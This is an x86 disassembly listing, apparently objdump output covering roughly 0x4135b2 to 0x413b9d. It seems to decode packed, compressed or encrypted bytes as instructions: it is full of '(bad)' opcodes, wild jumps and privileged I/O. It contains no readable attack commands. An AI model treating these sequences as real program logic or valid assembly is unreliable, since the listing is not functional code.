  4135b2:	2c b7                	sub    $0xb7,%al
  4135b4:	b4 74                	mov    $0x74,%ah
  4135b6:	17                   	pop    %ss
  4135b7:	ec                   	in     (%dx),%al
  4135b8:	60                   	pusha
  4135b9:	b3 d7                	mov    $0xd7,%bl
  4135bb:	31 15 0b 5d 16 75    	xor    %edx,0x75165d0b
  4135c1:	e9 d9 99 2c 81       	jmp    0x816dcf9f
  4135c6:	9c                   	pushf
  4135c7:	01 1a                	add    %ebx,(%edx)
  4135c9:	e3 c8                	jecxz  0x413593
  4135cb:	89 0f                	mov    %ecx,(%edi)
  4135cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4135ce:	07                   	pop    %es
  4135cf:	db 5b df             	fistpl -0x21(%ebx)
  4135d2:	53                   	push   %ebx
  4135d3:	3b 05 1c 75 09 82    	cmp    0x8209751c,%eax
  4135d9:	fc                   	cld
  4135da:	fa                   	cli
  4135db:	13 ef                	adc    %edi,%ebp
  4135dd:	15 0a b9 48 08       	adc    $0x848b90a,%eax
  4135e2:	81 f9 ac 7f 38 bf    	cmp    $0xbf387fac,%ecx
  4135e8:	c1 16 4d             	rcll   $0x4d,(%esi)
  4135eb:	89 17                	mov    %edx,(%edi)
  4135ed:	39 79 05             	cmp    %edi,0x5(%ecx)
  4135f0:	c1 03 c1             	roll   $0xc1,(%ebx)
  4135f3:	f9                   	stc
  4135f4:	02 5b f6             	add    -0xa(%ebx),%bl
  4135f7:	07                   	pop    %es
  4135f8:	62                   	(bad)
  4135f9:	d4 cc                	aam    $0xcc
  4135fb:	88 f4                	mov    %dh,%ah
  4135fd:	eb 24                	jmp    0x413623
  4135ff:	16                   	push   %ss
  413600:	d9 a9 dd de 5e 17    	fldcw  0x175ededd(%ecx)
  413606:	15 8b f4 8b 05       	adc    $0x58bf48b,%eax
  41360b:	02 89 40 ad f8 0c    	add    0xcf8ad40(%ecx),%cl
  413611:	af                   	scas   %es:(%edi),%eax
  413612:	99                   	cltd
  413613:	08 47 9c             	or     %al,-0x64(%edi)
  413616:	c3                   	ret
  413617:	eb b8                	jmp    0x4135d1
  413619:	25 de d8 b4 4a       	and    $0x4ab4d8de,%eax
  41361e:	ec                   	in     (%dx),%al
  41361f:	c1 72 07 3a          	shll   $0x3a,0x7(%edx)
  413623:	0c 06                	or     $0x6,%al
  413625:	c3                   	ret
  413626:	ac                   	lods   %ds:(%esi),%al
  413627:	df 4b f3             	fisttps -0xd(%ebx)
  41362a:	12 81 fa 17 75 e8    	adc    -0x178ae806(%ecx),%al
  413630:	84 c6                	test   %al,%dh
  413632:	8b 7f c7             	mov    -0x39(%edi),%edi
  413635:	8b 8d c3 8b ca 83    	mov    -0x7c35743d(%ebp),%ecx
  41363b:	e9 04 8d 1c 01       	jmp    0x15dc344
  413640:	8b 35 70 6f 7f 10    	mov    0x107f6f70,%esi
  413646:	7c 0f                	jl     0x413657
  413648:	c7 03 07 18 80 8b    	movl   $0x8b801807,(%ebx)
  41364e:	d1 b9 01 81 ee ed    	sarl   $1,-0x12117eff(%ecx)
  413654:	ad                   	lods   %ds:(%esi),%eax
  413655:	4f                   	dec    %edi
  413656:	13 04 7c             	adc    (%esp,%edi,2),%eax
  413659:	0c 20                	or     $0x20,%al
  41365b:	81 c9 02 15 89 d0    	or     $0xd0891502,%ecx
  413661:	f7 02 ee 6d 0b 12    	testl  $0x120b6dee,(%edx)
  413667:	ff 05 a0 3f b3 83    	incl   0x83b33fa0
  41366d:	ea 04 54 f5 ec 6e 63 	ljmp   $0x636e,$0xecf55404
  413674:	e2 fc                	loop   0x413672
  413676:	e3 7f                	jecxz  0x4136f7
  413678:	0a 01                	or     (%ecx),%al
  41367a:	15 a4 ef 10 d8       	adc    $0xd810efa4,%eax
  41367f:	3e 35 fd cd 3b 36    	ds xor $0x363bcdfd,%eax
  413685:	0c 7c                	or     $0x7c,%al
  413687:	0e                   	push   %cs
  413688:	83 ca 02             	or     $0x2,%edx
  41368b:	2a c0                	sub    %al,%al
  41368d:	83 0a c4             	orl    $0xffffffc4,(%edx)
  413690:	39 f8                	cmp    %edi,%eax
  413692:	4b                   	dec    %ebx
  413693:	c6                   	(bad)
  413694:	49                   	dec    %ecx
  413695:	0a 03                	or     (%ebx),%al
  413697:	c2 83 20             	ret    $0x2083
  41369a:	fe 07                	incb   (%edi)
  41369c:	be c2 e9 82 47       	mov    $0x4782e9c2,%esi
  4136a1:	18 e1                	sbb    %ah,%cl
  4136a3:	08 05 74 5f e9 19    	or     %al,0x19e95f74
  4136a9:	04 29                	add    $0x29,%al
  4136ab:	04 da                	add    $0xda,%al
  4136ad:	53                   	push   %ebx
  4136ae:	63 2b                	arpl   %ebp,(%ebx)
  4136b0:	73 98                	jae    0x41364a
  4136b2:	e9 6f 56 c8 33       	jmp    0x34098d26
  4136b7:	11 f7                	adc    %esi,%edi
  4136b9:	c2 fe e1             	ret    $0xe1fe
  4136bc:	1f                   	pop    %ds
  4136bd:	05 06 db 5b 68       	add    $0x685bdb06,%eax
  4136c2:	f6 01 d5             	testb  $0xd5,(%ecx)
  4136c5:	20 45 a6             	and    %al,-0x5a(%ebp)
  4136c8:	72 22                	jb     0x4136ec
  4136ca:	b6 67                	mov    $0x67,%dh
  4136cc:	0e                   	push   %cs
  4136cd:	fb                   	sti
  4136ce:	c6                   	(bad)
  4136cf:	3b 70 08             	cmp    0x8(%eax),%esi
  4136d2:	1d 06 7b eb de       	sbb    $0xdeeb7b06,%eax
  4136d7:	5a                   	pop    %edx
  4136d8:	20 09                	and    %cl,(%ecx)
  4136da:	94                   	xchg   %eax,%esp
  4136db:	54                   	push   %esp
  4136dc:	63 e1                	arpl   %esp,%ecx
  4136de:	33 d6                	xor    %esi,%edx
  4136e0:	fa                   	cli
  4136e1:	fd                   	std
  4136e2:	5e                   	pop    %esi
  4136e3:	9f                   	lahf
  4136e4:	03 a9 00 66 0b 25    	add    0x250b6600(%ecx),%ebp
  4136ea:	59                   	pop    %ecx
  4136eb:	03 f8                	add    %eax,%edi
  4136ed:	54                   	push   %esp
  4136ee:	11 f7                	adc    %esi,%edi
  4136f0:	2a 50 e2             	sub    -0x1e(%eax),%dl
  4136f3:	a8 02                	test   $0x2,%al
  4136f5:	67 fb                	addr16 sti
  4136f7:	63 31                	arpl   %esi,(%ecx)
  4136f9:	50                   	push   %eax
  4136fa:	e0 6f                	loopne 0x41376b
  4136fc:	01 4e 08             	add    %ecx,0x8(%esi)
  4136ff:	15 83 23 fe 3b       	adc    $0x3bfe2383,%eax
  413704:	db 7a 20             	fstpt  0x20(%edx)
  413707:	60                   	pusha
  413708:	af                   	scas   %es:(%edi),%eax
  413709:	08 c6                	or     %al,%dh
  41370b:	02 00                	add    (%eax),%al
  41370d:	25 bd 8d 52 3b       	and    $0x3b528dbd,%eax
  413712:	64 4a                	fs dec %edx
  413714:	b8 a6 82 a4 fb       	mov    $0xfba482a6,%eax
  413719:	cd d5                	int    $0xd5
  41371b:	6a 58                	push   $0x58
  41371d:	4a                   	dec    %edx
  41371e:	e7 87                	out    %eax,$0x87
  413720:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  413723:	2b d1                	sub    %ecx,%edx
  413725:	fe                   	(bad)
  413726:	fd                   	std
  413727:	06                   	push   %es
  413728:	db ad 7f d4 f8 2b    	fldt   0x2bf8d47f(%ebp)
  41372e:	3d c6 b4 83 f8       	cmp    $0xf883b4c6,%eax
  413733:	0c 7d                	or     $0x7d,%al
  413735:	14 67                	adc    $0x67,%al
  413737:	19 72 35             	sbb    %esi,0x35(%edx)
  41373a:	dd 01                	fldl   (%ecx)
  41373c:	04 6e                	add    $0x6e,%al
  41373e:	73 07                	jae    0x413747
  413740:	58                   	pop    %eax
  413741:	81 6e ec d0 eb 11 13 	subl   $0x1311ebd0,-0x14(%esi)
  413748:	d7                   	xlat   %ds:(%ebx)
  413749:	fe 8d bc 12 3b fb    	decb   -0x4c4ed44(%ebp)
  41374f:	d6                   	salc
  413750:	ed                   	in     (%dx),%eax
  413751:	8b 6c 10 85          	mov    -0x7b(%eax,%edx,1),%ebp
  413755:	ed                   	in     (%dx),%eax
  413756:	da 8b d5 2b d6 62    	fimull 0x62d62bd5(%ebx)
  41375c:	94                   	xchg   %eax,%esp
  41375d:	55                   	push   %ebp
  41375e:	ed                   	in     (%dx),%eax
  41375f:	87 d0                	xchg   %edx,%eax
  413761:	92                   	xchg   %eax,%edx
  413762:	fc                   	cld
  413763:	05 a6 73 0a 8d       	add    $0x8d0a73a6,%eax
  413768:	14 5e                	adc    $0x5e,%al
  41376a:	bb b3 ba be d0       	mov    $0xd0bebab3,%ebx
  41376f:	19 e8                	sbb    %ebp,%eax
  413771:	09 01                	or     %eax,(%ecx)
  413773:	97                   	xchg   %eax,%edi
  413774:	e0 92                	loopne 0x413708
  413776:	01 8a 83 65 0f 5c    	add    %ecx,0x5c0f6583(%edx)
  41377c:	c2 ca e7             	ret    $0xe7ca
  41377f:	47                   	inc    %edi
  413780:	de d5                	(bad)
  413782:	a2 84 a0 61 50       	mov    %al,0x5061a084
  413787:	03 c6                	add    %esi,%eax
  413789:	83 e8 dc             	sub    $0xffffffdc,%eax
  41378c:	46                   	inc    %esi
  41378d:	36 b6 4c             	ss mov $0x4c,%dh
  413790:	70 65                	jo     0x4137f7
  413792:	fe                   	(bad)
  413793:	37                   	aaa
  413794:	88 85 d2 71 6b b2    	mov    %al,-0x4d948e2e(%ebp)
  41379a:	74 63                	je     0x4137ff
  41379c:	c2 fa 64             	ret    $0x64fa
  41379f:	90                   	nop
  4137a0:	f4                   	hlt
  4137a1:	bc 71 39 d6 d3       	mov    $0xd3d63971,%esp
  4137a6:	10 0c 89             	adc    %cl,(%ecx,%ecx,4)
  4137a9:	5c                   	pop    %esp
  4137aa:	89 5b 9e             	mov    %ebx,-0x62(%ebx)
  4137ad:	1b eb                	sbb    %ebx,%ebp
  4137af:	3a 1b                	cmp    (%ebx),%bl
  4137b1:	75 b4                	jne    0x413767
  4137b3:	75 fa                	jne    0x4137af
  4137b5:	43                   	inc    %ebx
  4137b6:	08 13                	or     %dl,(%ebx)
  4137b8:	a9 5a 0e 2c 7b       	test   $0x7b2c0e5a,%eax
  4137bd:	30 b8 74 3e 3c 7c    	xor    %bh,0x7c3c3e74(%eax)
  4137c3:	0d 50 0b b8 84       	or     $0x84b80b50,%eax
  4137c8:	32 6c 60 ef          	xor    -0x11(%eax,%eiz,2),%ch
  4137cc:	79 17                	jns    0x4137e5
  4137ce:	a1 04 1d 05 2d       	mov    0x2d051d04,%eax
  4137d3:	87 0b                	xchg   %ecx,(%ebx)
  4137d5:	b3 4f                	mov    $0x4f,%bl
  4137d7:	d7                   	xlat   %ds:(%ebx)
  4137d8:	36 08 7e 40          	or     %bh,%ss:0x40(%esi)
  4137dc:	08 08                	or     %cl,(%eax)
  4137de:	0c bf                	or     $0xbf,%al
  4137e0:	1b 8e 09 9a 63 a1    	sbb    -0x5e9c65f7(%esi),%ecx
  4137e6:	2b a1 13 83 c8 18    	sub    0x18c88313(%ecx),%esp
  4137ec:	af                   	scas   %es:(%edi),%eax
  4137ed:	9d                   	popf
  4137ee:	1b d0                	sbb    %eax,%edx
  4137f0:	15 0c 8b 06 30       	adc    $0x30068b0c,%eax
  4137f5:	83 e7 9e             	and    $0xffffff9e,%edi
  4137f8:	69 c6 0e 06 25 8f    	imul   $0x8f25060e,%esi,%eax
  4137fe:	b0 c1                	mov    $0xc1,%al
  413800:	c2 36 e1             	ret    $0xe136
  413803:	f0 80 8d b6 a5 6c 9a 	lock orb $0xd,-0x65935a4a(%ebp)
  41380a:	0d 
  41380b:	6c                   	insb   (%dx),%es:(%edi)
  41380c:	b5 fc                	mov    $0xfc,%ch
  41380e:	4c                   	dec    %esp
  41380f:	0c f0                	or     $0xf0,%al
  413811:	08 14 c6             	or     %dl,(%esi,%eax,8)
  413814:	f8                   	clc
  413815:	31 2a                	xor    %ebp,(%edx)
  413817:	97                   	xchg   %eax,%edi
  413818:	08 0b                	or     %cl,(%ebx)
  41381a:	52                   	push   %edx
  41381b:	8b 07                	mov    (%edi),%eax
  41381d:	3b d8                	cmp    %eax,%ebx
  41381f:	57                   	push   %edi
  413820:	2a fc                	sub    %ah,%bh
  413822:	57                   	push   %edi
  413823:	30 a8 10 29 07 01    	xor    %ch,0x1072910(%eax)
  413829:	47                   	inc    %edi
  41382a:	8f 0a 04 af          	(bad)
  41382e:	b0 b0                	mov    $0xb0,%al
  413830:	44                   	inc    %esp
  413831:	f3 07                	repz pop %es
  413833:	24 49                	and    $0x49,%al
  413835:	c6                   	(bad)
  413836:	16                   	push   %ss
  413837:	18 b8 d0 d1 b0 80    	sbb    %bh,-0x7f4f2e30(%eax)
  41383d:	16                   	push   %ss
  41383e:	95                   	xchg   %eax,%ebp
  41383f:	11 23                	adc    %esp,(%ebx)
  413841:	04 ba                	add    $0xba,%al
  413843:	1b 73 8f             	sbb    -0x71(%ebx),%esi
  413846:	f0 70 77             	lock jo 0x4138c0
  413849:	83 6f 04 19          	subl   $0x19,0x4(%edi)
  41384d:	81 8b 1e 08 5b a3 58 	orl    $0x7e5b8258,-0x5ca4f7e2(%ebx)
  413854:	82 5b 7e 
  413857:	10 5f 9b             	adc    %bl,-0x65(%edi)
  41385a:	68 cf 68 e4 d4       	push   $0xd4e468cf
  41385f:	8d                   	lea    (bad),%esi
  413860:	f0 4a                	lock dec %edx
  413862:	06                   	push   %es
  413863:	1c 90                	sbb    $0x90,%al
  413865:	1d dd 38 4d 8b       	sbb    $0x8b4d38dd,%eax
  41386a:	c4 8c 0d 3c 11 83 12 	les    0x1283113c(%ebp,%ecx,1),%ecx
  413871:	65 02 4b 23          	add    %gs:0x23(%ebx),%cl
  413875:	7c cd                	jl     0x413844
  413877:	12 27                	adc    (%edi),%ah
  413879:	d5 d8                	aad    $0xd8
  41387b:	69 8d c3 30 ac 14 4e 	imul   $0x5f852f4e,0x14ac30c3(%ebp),%ecx
  413882:	2f 85 5f 
  413885:	f4                   	hlt
  413886:	8e 2c 3d bd 34 a1 c0 	mov    -0x3f5ecb43(,%edi,1),%gs
  41388d:	f8                   	clc
  41388e:	02 3d 06 7f c0 15    	add    0x15c07f06,%bh
  413894:	06                   	push   %es
  413895:	81 97 23 a9 54 82 d2 	adcl   $0x750875d2,-0x7dab56dd(%edi)
  41389c:	75 08 75 
  41389f:	ea f5 e1 18 99 c0 7b 	ljmp   $0x7bc0,$0x9918e1f5
  4138a6:	f0 bf 81 bd 08 2c    	lock mov $0x2c08bd81,%edi
  4138ac:	61                   	popa
  4138ad:	c2 8c f8             	ret    $0xf88c
  4138b0:	fc                   	cld
  4138b1:	8e 89 84 c2 e3 48    	mov    0x48e3c284(%ecx),%cs
  4138b7:	7d 9a                	jge    0x413853
  4138b9:	1f                   	pop    %ds
  4138ba:	87 7e 7b             	xchg   %edi,0x7b(%esi)
  4138bd:	0a d6                	or     %dh,%dl
  4138bf:	b8 15 da ba 17       	mov    $0x17bada15,%eax
  4138c4:	7f 8d                	jg     0x413853
  4138c6:	17                   	pop    %ss
  4138c7:	45                   	inc    %ebp
  4138c8:	13 1f                	adc    (%edi),%ebx
  4138ca:	74 1c                	je     0x4138e8
  4138cc:	63 30                	arpl   %esi,(%eax)
  4138ce:	5e                   	pop    %esi
  4138cf:	ad                   	lods   %ds:(%esi),%eax
  4138d0:	1f                   	pop    %ds
  4138d1:	eb 63                	jmp    0x413936
  4138d3:	15 0d d4 0e 28       	adc    $0x280ed40d,%eax
  4138d8:	ab                   	stos   %eax,%es:(%edi)
  4138d9:	34 db                	xor    $0xdb,%al
  4138db:	fb                   	sti
  4138dc:	75 4e                	jne    0x41392c
  4138de:	0c 99                	or     $0x99,%al
  4138e0:	c8 07 bf c3          	enter  $0xbf07,$0xc3
  4138e4:	70 bb                	jo     0x4138a1
  4138e6:	bd 0f 43 3b 75       	mov    $0x753b430f,%ebp
  4138eb:	23 a4 29 04 83 7d c6 	and    -0x39827cfc(%ecx,%ebp,1),%esp
  4138f2:	8e 38                	mov    (%eax),%?
  4138f4:	c2 0e 5a             	ret    $0x5a0e
  4138f7:	08 7a 45             	or     %bh,0x45(%edx)
  4138fa:	00 b2 01 35 7a d6    	add    %dh,-0x2985caff(%edx)
  413900:	90                   	nop
  413901:	46                   	inc    %esi
  413902:	27                   	daa
  413903:	d6                   	salc
  413904:	f0 21 83 ee 1a a7 f7 	lock and %eax,-0x858e512(%ebx)
  41390b:	d9 14 35 eb 4c f4 55 	fsts   0x55f44ceb(,%esi,1)
  413912:	c6                   	(bad)
  413913:	7a 97                	jp     0x4138ac
  413915:	a9 d4 af a2 10       	test   $0x10a2afd4,%eax
  41391a:	53                   	push   %ebx
  41391b:	d3 03                	roll   %cl,(%ebx)
  41391d:	d6                   	salc
  41391e:	92                   	xchg   %eax,%edx
  41391f:	b1 15                	mov    $0x15,%cl
  413921:	0a c4                	or     %ah,%al
  413923:	64 a2 1c 8b 75 35    	mov    %al,%fs:0x35758b1c
  413929:	d7                   	xlat   %ds:(%ebx)
  41392a:	a3 a3 e4 3c 07       	mov    %eax,0x73ce4a3
  41392f:	ac                   	lods   %ds:(%esi),%al
  413930:	18 06                	sbb    %al,(%esi)
  413932:	86 60 30             	xchg   %ah,0x30(%eax)
  413935:	85 4d 5d             	test   %ecx,0x5d(%ebp)
  413938:	eb 54                	jmp    0x41398e
  41393a:	33 30                	xor    (%eax),%esi
  41393c:	83 48 cd 2e          	orl    $0x2e,-0x33(%eax)
  413940:	52                   	push   %edx
  413941:	b0 b7                	mov    $0xb7,%al
  413943:	e9 c6 b2 08 5c       	jmp    0x5c49ec0e
  413948:	74 e6                	je     0x413930
  41394a:	fb                   	sti
  41394b:	f8                   	clc
  41394c:	d5 7e                	aad    $0x7e
  41394e:	0a a0 b9 41 83 dd    	or     -0x227cbe47(%eax),%ah
  413954:	fc                   	cld
  413955:	bb 10 cb a9 45       	mov    $0x45a9cb10,%ebx
  41395a:	c8 20 12 07          	enter  $0x1220,$0x7
  41395e:	90                   	nop
  41395f:	e5 31                	in     $0x31,%eax
  413961:	21 83 c3 45 34 c3    	and    %eax,-0x3ccbba3d(%ebx)
  413967:	db ad 65 83 fb d9    	fldt   -0x26047c9b(%ebp)
  41396d:	05 bb 0c 34 42       	add    $0x42340cbb,%eax
  413972:	2c 21                	sub    $0x21,%al
  413974:	46                   	inc    %esi
  413975:	3f                   	aas
  413976:	13 0f                	adc    (%edi),%ecx
  413978:	8f                   	(bad)
  413979:	93                   	xchg   %eax,%ebx
  41397a:	ec                   	in     (%dx),%al
  41397b:	8b d7                	mov    %edi,%edx
  41397d:	54                   	push   %esp
  41397e:	7b 20                	jnp    0x4139a0
  413980:	84 74 79 b7          	test   %dh,-0x49(%ecx,%edi,2)
  413984:	32 c3                	xor    %bl,%al
  413986:	ae                   	scas   %es:(%edi),%al
  413987:	02 13                	add    (%ebx),%dl
  413989:	f6 c2 42             	test   $0x42,%dl
  41398c:	57                   	push   %edi
  41398d:	d0 75 1a             	shlb   $1,0x1a(%ebp)
  413990:	29 0d bc 06 04 5e    	sub    %ecx,0x5e0406bc
  413996:	3e ff 89 7c 81 26 8b 	decl   %ds:-0x74d97e84(%ecx)
  41399d:	cb                   	lret
  41399e:	be 3d d4 0a 2f       	mov    $0x2f0ad43d,%esi
  4139a3:	47                   	inc    %edi
  4139a4:	44                   	inc    %esp
  4139a5:	8f 0a 89 4d          	(bad)
  4139a9:	8b 02                	mov    (%edx),%eax
  4139ab:	86 dd                	xchg   %bl,%ch
  4139ad:	94                   	xchg   %eax,%esp
  4139ae:	7b 4d                	jnp    0x4139fd
  4139b0:	05 80 8b 52 08       	add    $0x8528b80,%eax
  4139b5:	f6 20                	mulb   (%eax)
  4139b7:	0b 0c e6             	or     (%esi,%eiz,8),%ecx
  4139ba:	bb f9 eb 5c 1d       	mov    $0x1d5cebf9,%ebx
  4139bf:	8a fd                	mov    %ch,%bh
  4139c1:	70 ec                	jo     0x4139af
  4139c3:	25 48 cf 3b 1d       	and    $0x1d3bcf48,%eax
  4139c8:	e8 7f 4a 29 07       	call   0x76a844c
  4139cd:	c2 90 de             	ret    $0xde90
  4139d0:	43                   	inc    %ebx
  4139d1:	5b                   	pop    %ebx
  4139d2:	0d 03 0e 31 99       	or     $0x99310e03,%eax
  4139d7:	e1 50                	loope  0x413a29
  4139d9:	36 72 1d             	ss jb  0x4139f9
  4139dc:	d3 54 eb 32          	rcll   %cl,0x32(%ebx,%ebp,8)
  4139e0:	a1 c9 49 c2 1d       	mov    0x1dc249c9,%eax
  4139e5:	0e                   	push   %cs
  4139e6:	54                   	push   %esp
  4139e7:	1f                   	pop    %ds
  4139e8:	b1 cf                	mov    $0xcf,%cl
  4139ea:	20 c7                	and    %al,%bh
  4139ec:	66 68 13 8b          	pushw  $0x8b13
  4139f0:	2a 89 2a 5d af 9c    	sub    -0x6350a2d6(%ecx),%cl
  4139f6:	5c                   	pop    %esp
  4139f7:	84 86 8f 51 8d 7c    	test   %al,0x7c8d518f(%esi)
  4139fd:	df 4e 3a             	fisttps 0x3a(%esi)
  413a00:	c8 21 94 1f          	enter  $0x9421,$0x1f
  413a04:	75 16                	jne    0x413a1c
  413a06:	f7 08 3e 1b 5e 6b    	testl  $0x6b5e1b3e,(%eax)
  413a0c:	c7 38 06 98 12       	xbegin 0x12d94049,(bad)
  413a11:	71 6e                	jno    0x413a81
  413a13:	22 bc a1 14 48 af f8 	and    -0x750b7ec(%ecx,%eiz,4),%bh
  413a1a:	8b 1e                	mov    (%esi),%ebx
  413a1c:	f6 c3 f7             	test   $0xf7,%bl
  413a1f:	60                   	pusha
  413a20:	67 0b 9d 0f 42       	or     0x420f(%di),%ebx
  413a25:	09 3b                	or     %edi,(%ebx)
  413a27:	41                   	inc    %ecx
  413a28:	ff 0d c8 de a6 08    	decl   0x8a6dec8
  413a2e:	b4 b8                	mov    $0xb8,%ah
  413a30:	c3                   	ret
  413a31:	bc 29 05 cf 4b       	mov    $0x4bcf0529,%esp
  413a36:	bc 6e d0 29 0e       	mov    $0xe29d06e,%esp
  413a3b:	45                   	inc    %ebp
  413a3c:	8b f0                	mov    %eax,%esi
  413a3e:	59                   	pop    %ecx
  413a3f:	08 ec                	or     %ch,%ah
  413a41:	40                   	inc    %eax
  413a42:	eb 07                	jmp    0x413a4b
  413a44:	86 08                	xchg   %cl,(%eax)
  413a46:	f7 e7                	mul    %edi
  413a48:	eb 3e                	jmp    0x413a88
  413a4a:	b5 0d                	mov    $0xd,%ch
  413a4c:	0c 19                	or     $0x19,%al
  413a4e:	0a 9a c2 3b 22 c4    	or     -0x3bddc43e(%edx),%bl
  413a54:	68 c0 94 17 03       	push   $0x31794c0
  413a59:	2b ad f0 02 87 19    	sub    0x198702f0(%ebp),%ebp
  413a5f:	76 e1                	jbe    0x413a42
  413a61:	48                   	dec    %eax
  413a62:	3b 3d 0c eb 61 42    	cmp    0x4261eb0c,%edi
  413a68:	d9 70 75             	fnstenv 0x75(%eax)
  413a6b:	2c 55                	sub    $0x55,%al
  413a6d:	60                   	pusha
  413a6e:	81 db 62 c4 ea 3a    	sbb    $0x3aeac462,%ebx
  413a74:	3c de                	cmp    $0xde,%al
  413a76:	05 8c 6f e2 17       	add    $0x17e26f8c,%eax
  413a7b:	78 13                	js     0x413a90
  413a7d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  413a7e:	db 0e                	fisttpl (%esi)
  413a80:	f6 c2 02             	test   $0x2,%dl
  413a83:	74 1c                	je     0x413aa1
  413a85:	e7 b0                	out    %eax,$0xb0
  413a87:	1c 4c                	sbb    $0x4c,%al
  413a89:	21 fd                	and    %edi,%ebp
  413a8b:	fb                   	sti
  413a8c:	0b 23                	or     (%ebx),%esp
  413a8e:	d7                   	xlat   %ds:(%ebx)
  413a8f:	0b fc                	or     %esp,%edi
  413a91:	37                   	aaa
  413a92:	83 08 01             	orl    $0x1,(%eax)
  413a95:	eb 29                	jmp    0x413ac0
  413a97:	47                   	inc    %edi
  413a98:	83 78 04 07          	cmpl   $0x7,0x4(%eax)
  413a9c:	7c cd                	jl     0x413a6b
  413a9e:	4d                   	dec    %ebp
  413a9f:	d8 ed                	fsubr  %st(5),%st
  413aa1:	06                   	push   %es
  413aa2:	0a 08                	or     (%eax),%cl
  413aa4:	0c 23                	or     $0x23,%al
  413aa6:	13 c1                	adc    %ecx,%eax
  413aa8:	8d bc a6 d3 49 39 d3 	lea    -0x2cc6b62d(%esi,%eiz,4),%edi
  413aaf:	90                   	nop
  413ab0:	2c a1                	sub    $0xa1,%al
  413ab2:	1d 3a 00 79 20       	sbb    $0x2079003a,%eax
  413ab7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413ab8:	75 22                	jne    0x413adc
  413aba:	5d                   	pop    %ebp
  413abb:	65 63 57 92          	arpl   %edx,%gs:-0x6e(%edi)
  413abf:	cf                   	iret
  413ac0:	89 83 c6 ec e6 53    	mov    %eax,0x53e6ecc6(%ebx)
  413ac6:	0b 7f 9a             	or     -0x66(%edi),%edi
  413ac9:	fe                   	(bad)
  413aca:	be 8b e8 83 ed       	mov    $0xed83e88b,%esi
  413acf:	63 7d d7             	arpl   %edi,-0x29(%ebp)
  413ad2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413ad3:	0b 1d 3c a9 71 c7    	or     0xc771a93c,%ebx
  413ad9:	c7                   	(bad)
  413ada:	3b fe                	cmp    %esi,%edi
  413adc:	f8                   	clc
  413add:	ea 6c b5 cd b0 01 14 	ljmp   $0x1401,$0xb0cdb56c
  413ae4:	4f                   	dec    %edi
  413ae5:	0a 48 83             	or     -0x7d(%eax),%cl
  413ae8:	46                   	inc    %esi
  413ae9:	68 38 5a ce d6       	push   $0xd6ce5a38
  413aee:	e7 7b                	out    %eax,$0x7b
  413af0:	0a 38                	or     (%eax),%bh
  413af2:	07                   	pop    %es
  413af3:	31 0a                	xor    %ecx,(%edx)
  413af5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413af6:	0a 71 5d             	or     0x5d(%ecx),%dh
  413af9:	7d 80                	jge    0x413a7b
  413afb:	02 03                	add    (%ebx),%al
  413afd:	46                   	inc    %esi
  413afe:	05 87 0f 94 77       	add    $0x77940f87,%eax
  413b03:	e4 b0                	in     $0xb0,%al
  413b05:	d7                   	xlat   %ds:(%ebx)
  413b06:	23 15 1e 29 8b f7    	and    0xf78b291e,%edx
  413b0c:	4e                   	dec    %esi
  413b0d:	ad                   	lods   %ds:(%esi),%eax
  413b0e:	73 c1                	jae    0x413ad1
  413b10:	db 36                	(bad) (%esi)
  413b12:	5b                   	pop    %ebx
  413b13:	f6 03 02             	testb  $0x2,(%ebx)
  413b16:	53                   	push   %ebx
  413b17:	dd 01                	fldl   (%ecx)
  413b19:	4e                   	dec    %esi
  413b1a:	c4 0b                	les    (%ebx),%ecx
  413b1c:	06                   	push   %es
  413b1d:	62 de 0d             	(bad) {bad}
  413b20:	a8 1b                	test   $0x1b,%al
  413b22:	8b dd                	mov    %ebp,%ebx
  413b24:	06                   	push   %es
  413b25:	6d                   	insl   (%dx),%es:(%edi)
  413b26:	07                   	pop    %es
  413b27:	cd a8                	int    $0xa8
  413b29:	2d 10 89 03 1e       	sub    $0x1e038910,%eax
  413b2e:	07                   	pop    %es
  413b2f:	aa                   	stos   %al,%es:(%edi)
  413b30:	61                   	popa
  413b31:	36 1b 34 3b          	sbb    %ss:(%ebx,%edi,1),%esi
  413b35:	b3 c7                	mov    $0xc7,%bl
  413b37:	dd 18                	fstpl  (%eax)
  413b39:	0c 76                	or     $0x76,%al
  413b3b:	14 83                	adc    $0x83,%al
  413b3d:	67 40                	addr16 inc %eax
  413b3f:	3b 10                	cmp    (%eax),%edx
  413b41:	7c e9                	jl     0x413b2c
  413b43:	bd d9 a9 53 ec       	mov    $0xec53a9d9,%ebp
  413b48:	67 09 7a 18          	or     %edi,0x18(%bp,%si)
  413b4c:	90                   	nop
  413b4d:	9e                   	sahf
  413b4e:	c5 2e                	lds    (%esi),%ebp
  413b50:	18 27                	sbb    %ah,(%edi)
  413b52:	13 03                	adc    (%ebx),%eax
  413b54:	35 23 42 21 c6       	xor    $0xc6214223,%eax
  413b59:	17                   	pop    %ss
  413b5a:	4f                   	dec    %edi
  413b5b:	01 36                	add    %esi,(%esi)
  413b5d:	27                   	daa
  413b5e:	b6 21                	mov    $0x21,%dh
  413b60:	58                   	pop    %eax
  413b61:	eb 8f                	jmp    0x413af2
  413b63:	26 0b f0             	es or  %eax,%esi
  413b66:	89 d9                	mov    %ebx,%ecx
  413b68:	f8                   	clc
  413b69:	d4 43                	aam    $0x43
  413b6b:	0d 5f 17 94 df       	or     $0xdf94175f,%eax
  413b70:	b0 4d                	mov    $0x4d,%al
  413b72:	82 c2 a9             	add    $0xa9,%dl
  413b75:	d8 d4                	fcom   %st(4)
  413b77:	66 00 0e             	data16 add %cl,(%esi)
  413b7a:	02 3b                	add    (%ebx),%bh
  413b7c:	c4 7d 0e             	les    0xe(%ebp),%edi
  413b7f:	c2 bd 16             	ret    $0x16bd
  413b82:	0d ad 9d df 71       	or     $0x71df9dad,%eax
  413b87:	f8                   	clc
  413b88:	dc 9b 50 1e a8 86    	fcompl -0x7957e1b0(%ebx)
  413b8e:	c3                   	ret
  413b8f:	d0 0e                	rorb   $1,(%esi)
  413b91:	ab                   	stos   %eax,%es:(%edi)
  413b92:	5f                   	pop    %edi
  413b93:	af                   	scas   %es:(%edi),%eax
  413b94:	64 4a                	fs dec %edx
  413b96:	d1 e2                	shl    $1,%edx
  413b98:	e5 3a                	in     $0x3a,%eax
  413b9a:	03 14 87             	add    (%edi,%eax,4),%edx
  413b9d:	c5 2e                	lds    (%esi),%ebp
